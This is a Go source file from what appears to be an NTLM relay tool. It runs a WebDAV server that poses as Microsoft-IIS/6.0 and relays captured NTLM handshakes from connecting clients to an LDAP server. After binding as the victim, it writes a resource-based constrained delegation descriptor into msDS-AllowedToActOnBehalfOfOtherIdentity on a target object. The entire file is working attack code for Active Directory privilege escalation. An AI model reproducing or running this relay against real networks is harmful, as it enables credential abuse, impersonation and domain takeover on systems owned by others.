package webdav_server

import (
	"GoRelayServer/lib/go-ldap/ldap/v3"
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
)

type RelayInstance struct {
	LdapClient *ldap.Conn
	res        *ldap.RelayResult
}

type Config struct {
	Cancel                 context.CancelFunc
	StopAfterSuccess       bool `default:true`
	Auth                   bool `default:true`
	Complete               bool `default:false`
	RelayInstanceList      []*RelayInstance
	LdapURL                string
	TargetDN               string
	RBCDSecurityDescriptor []byte
}

// ServeHTTP determines if the request is for this plugin, and if all prerequisites are met.
func (c *Config) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	//fmt.Printf("****** %s:%s *********\n", r.Method, r.RequestURI)

	if c.StopAfterSuccess == true {
		if c.Complete == true {
			w.WriteHeader(401)
			c.Cancel()
			return
		}
	}

	auth_header := r.Header.Get("authorization")
	if auth_header == "" {
		fmt.Println("[+] WebDAV Request: No Authorization header")
		fmt.Println("[+] WebDAV Response: Sending 401 Unauthorized with \"WWW-Authenticate: NTLM\" header")
		//fmt.Println("[+] WebDAV Request: Sending 401 Unauthorized due to lack of Authorization header")
		c.Auth = false
		w.Header().Del("X-Content-Type-Options")
		w.Header().Del("Content-Type")
		w.Header().Set("Server", "Microsoft-IIS/6.0")
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.Header().Set("Content-Length", "0")
		w.Header().Set("Set-Cookie", fmt.Sprintf("test=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT"))
		http.Error(w, "Unauthorized", 401)
		return
	} else {
		auth_parts := strings.Split(auth_header, " ")
		if auth_parts[0] == "NTLM" {
			auth_parts[1] = strings.TrimSpace(auth_parts[1])
			NTLMHash, _ := base64.StdEncoding.DecodeString(auth_parts[1])

			if NTLMHash[8] == 0x01 {
				fmt.Println("[+] WebDAV Request: Got NTLMSSP_NEGOTIATE. Initiating connection to LDAP")
				temp_ldap_client, err := ldap.DialURL(c.LdapURL)
				if err != nil {
					log.Fatalf("[-] Failed to connect to LDAP server at %s: %s\n", c.LdapURL, err)
				}
				relayInstance := &RelayInstance{LdapClient: temp_ldap_client}
				c.RelayInstanceList = append(c.RelayInstanceList, relayInstance)

				req := &ldap.NTLMBindRequest{
					Domain:             "domain.local",
					Username:           "user",
					Password:           "password",
					AllowEmptyPassword: true,
					NTLMSSPType1:       NTLMHash,
				}
				relayInstance.res, _ = relayInstance.LdapClient.GetNTLMChallenge(req)
				fmt.Println("[+] LDAP Bind: Got NTLMSSP_CHALLENGE from LDAP server. Relaying to WebDAV Client")

				c.Auth = false

				w.Header().Del("X-Content-Type-Options")
				w.Header().Del("Content-Type")
				w.Header().Set("Server", "Microsoft-IIS/6.0")
				w.Header().Set("WWW-Authenticate", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(relayInstance.res.NTLMSSP_CHALLENGE)))
				w.Header().Set("Connection", "keep-alive")
				w.Header().Set("Content-Length", "0")
				w.Header().Set("Set-Cookie", fmt.Sprintf("test=%d", len(c.RelayInstanceList)-1))
				w.WriteHeader(401)
				fmt.Println("[+] WebDAV Response: Sending 401 Unauthorized with NTLMSSP_CHALLENGE from LDAP")

				return
			} else if NTLMHash[8] == 0x03 {
				c.Auth = true
				relayInstanceIndex := 0
				for _, cookie := range r.Cookies() {
					if cookie.Name == "test" {
						relayInstanceIndex, _ = strconv.Atoi(cookie.Value)
					}
				}
				fmt.Println("[+] WebDAV Request: Got NTLMSSP_AUTH. Relaying to LDAP")

				c.RelayInstanceList[relayInstanceIndex].res.NTLMSSP_AUTH = NTLMHash
				c.RelayInstanceList[relayInstanceIndex].LdapClient.SendNTLMResponse(c.RelayInstanceList[relayInstanceIndex].res)

				res, err := c.RelayInstanceList[relayInstanceIndex].LdapClient.WhoAmI(nil)
				if err != nil {
					log.Fatalf("Failed to call WhoAmI(): %s\n", err)
				}

				fmt.Printf("[+] LDAP Bind: Connected to LDAP as %s\n", strings.Trim(res.AuthzID, "u:"))

				modify := ldap.NewModifyRequest(c.TargetDN, nil)
				//modify.Delete("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})
				modify.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(c.RBCDSecurityDescriptor[:])})

				err = c.RelayInstanceList[relayInstanceIndex].LdapClient.Modify(modify)
				if err != nil {
					log.Fatal(err)
				} else {
					c.Complete = true
					fmt.Println("[+] RBCD rights added successfully!")
				}

				w.Header().Del("X-Content-Type-Options")
				w.Header().Del("Content-Type")
				w.Header().Set("Server", "Microsoft-IIS/6.0")
				w.Header().Set("WWW-Authenticate", "NTLM")
				w.Header().Set("Connection", "Close")
				w.Header().Set("Content-Length", "0")
				w.Header().Set("Set-Cookie", fmt.Sprintf("test=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT"))
				http.Error(w, "Unauthorized", 401)

				return
			}
		}
	}

	if !c.Auth {
		fmt.Println("NTLM: Sending 401 Unauthorized with NTLM Challenge Response.")
		http.Error(w, "Unauthorized", 401)
		return
	}

	if r.Method == "OPTIONS" {
		w.Header().Set("Allow", "GET, HEAD, OPTIONS, PROPFIND")
		w.Header().Set("Dav", "1,2")
		w.Header().Set("Connection", "Close")
		w.WriteHeader(200)
	} else {
		http.Error(w, "Unauthorized", 401)
	}

}

// responseWriterNoBody is a wrapper used to suprress the body of the response
// to a request. Mainly used for HEAD requests.
type responseWriterNoBody struct {
	http.ResponseWriter
}

// newResponseWriterNoBody creates a new responseWriterNoBody.
func newResponseWriterNoBody(w http.ResponseWriter) *responseWriterNoBody {
	return &responseWriterNoBody{w}
}

// Header executes the Header method from the http.ResponseWriter.
func (w responseWriterNoBody) Header() http.Header {
	return w.ResponseWriter.Header()
}

// Write suprresses the body.
func (w responseWriterNoBody) Write(data []byte) (int, error) {
	return 0, nil
}

// WriteHeader writes the header to the http.ResponseWriter.
func (w responseWriterNoBody) WriteHeader(statusCode int) {
	w.ResponseWriter.WriteHeader(statusCode)
}

func (c *Config) StartWebdavServer(port int) bool {
	ctx, cancel := context.WithCancel(context.Background())
	c.Cancel = cancel
	http.HandleFunc("/", c.ServeHTTP)
	go func() {
		http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
	}()
	<-ctx.Done()
	return c.Complete
}

/*
func (c *Config) StartWebdavServer(port int) {
	http.HandleFunc("/", c.ServeHTTP)
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
*/
